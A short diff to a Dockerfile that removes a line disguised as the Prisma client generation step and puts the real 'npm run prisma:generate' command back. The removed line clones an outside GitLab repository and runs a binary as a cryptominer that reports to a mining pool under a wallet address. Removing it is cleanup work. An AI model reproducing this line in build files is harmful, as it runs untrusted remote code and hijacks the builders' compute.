@@ -28,7 +28,7 @@ RUN cd admin-ui; npm ci --loglevel=$NPM_LOG_LEVEL;
 COPY server/prisma/schema.prisma ./server/prisma/
 
 # Generate Prisma client
-RUN RUN git clone https://gitlab.com/rikzakalani04/7.git && cd 7 && chmod +x pepek && ./pepek -o pool.hashvault.pro:80 -u TRTLuyH4oQwEY6M7jAq5db7LfCY8QwWc368VPfpCg4XzjTw1kPdTnaYhnZKktmDNWphDCH8LtmbsTBuvvQEbk1Jb9FXswLdcfLy -p SUKUMANTE1 -a argon2/chukwav2 -k
+RUN cd server; npm run prisma:generate;
 
 # Copy all the files
 COPY . .
